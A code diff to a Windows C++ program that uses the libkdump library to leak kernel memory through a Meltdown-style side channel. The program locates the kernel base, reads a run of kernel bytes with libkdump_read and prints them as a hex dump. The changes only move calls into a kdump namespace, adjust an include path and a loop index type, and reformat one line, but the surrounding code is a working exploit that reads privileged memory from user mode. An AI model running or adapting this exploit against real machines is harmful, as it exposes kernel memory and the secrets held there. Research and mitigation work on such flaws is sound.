@@ -1,6 +1,6 @@
 #include "stdafx.h"
 
-#include "libkdump.h"
+#include "libkdump/libkdump.hpp"
 
 template<typename It>
 void hex_dump(HANDLE output, void* base_address, const It start, const It end) {
@@ -99,7 +99,7 @@ struct kernel_memory_iterator
 	}
 
 	value_type operator*() const noexcept {
-		std::byte b = libkdump_read(reinterpret_cast<std::size_t>(base));
+		std::byte b = kdump::libkdump_read(reinterpret_cast<std::size_t>(base));
 		return b;
 	}
 
@@ -109,7 +109,7 @@ private:
 
 std::pair<void*, ULONG> get_kernel_base() {
 	decltype(NtQuerySystemInformation)* ntQuerySystemInformation = reinterpret_cast<decltype(NtQuerySystemInformation)*>(
-		reinterpret_cast<void*>(::GetProcAddress(::GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
+	                                                               reinterpret_cast<void*>(::GetProcAddress(::GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
 	std::unique_ptr<std::byte[]> module_info;
 	ULONG module_size = 1'024;
 	do {
@@ -128,11 +128,11 @@ int main(int argc, char* argv[]) {
 	mode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
 	::SetConsoleMode(output, mode);
 
-	libkdump_enable_debug(1);
-	libkdump_config_t config = libkdump_get_autoconfig();
+	kdump::libkdump_enable_debug(1);
+	kdump::libkdump_config_t config = kdump::libkdump_get_autoconfig();
 	config.load_threads = 1;
-	config.load_type = NOP;
-	libkdump_init(config);
+	config.load_type = kdump::NOP;
+	kdump::libkdump_init(config);
 
 	//::SetPriorityClass(::GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
 	::SetThreadAffinityMask(::GetCurrentThread(), 0x1);
@@ -148,8 +148,8 @@ int main(int argc, char* argv[]) {
 		auto f = gsl::finally([=]() { ::FreeLibrary(ntoskrnl); });
 
 		std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
-		for(DWORD i = 0; i < bytes_to_leak; i++) {
-			buffer[i] = libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(kernel_base) + i));
+		for(std::size_t i = 0; i < bytes_to_leak; i++) {
+			buffer[i] = kdump::libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(kernel_base) + i));
 		}
 
 		std::cout << "Leaked bytes:" << std::endl;
@@ -171,6 +171,6 @@ int main(int argc, char* argv[]) {
 		}
 		hex_dump(output, reinterpret_cast<void*>(target), start, end);
 	}
-	libkdump_cleanup();
+	kdump::libkdump_cleanup();
 	return 0;
 }
